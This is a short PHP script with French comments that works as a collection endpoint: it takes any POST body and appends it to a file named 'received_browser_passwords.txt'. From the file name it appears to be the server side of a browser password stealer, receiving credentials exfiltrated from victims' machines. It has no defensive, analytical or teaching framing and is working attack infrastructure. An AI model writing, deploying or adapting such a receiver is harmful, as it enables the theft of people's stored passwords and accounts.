<?php
// Définir le fichier de stockage des données
$filename = 'received_browser_passwords.txt';

// Vérifier si les données sont envoyées en POST
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Récupérer le contenu brut de la requête POST
    $data = file_get_contents('php://input');
    
    // Vérifier si des données ont été reçues
    if ($data) {
        // Ouvrir le fichier pour écrire les données reçues
        $file = fopen($filename, 'a');
        if ($file) {
            fwrite($file, $data . "\n");
            fclose($file);
            echo 'Données reçues et stockées dans ' . $filename;
        } else {
            echo 'Erreur d\'ouverture du fichier.';
        }
    } else {
        echo 'Aucune donnée reçue.';
    }
} else {
    echo 'Méthode de requête non supportée.';
}
?>
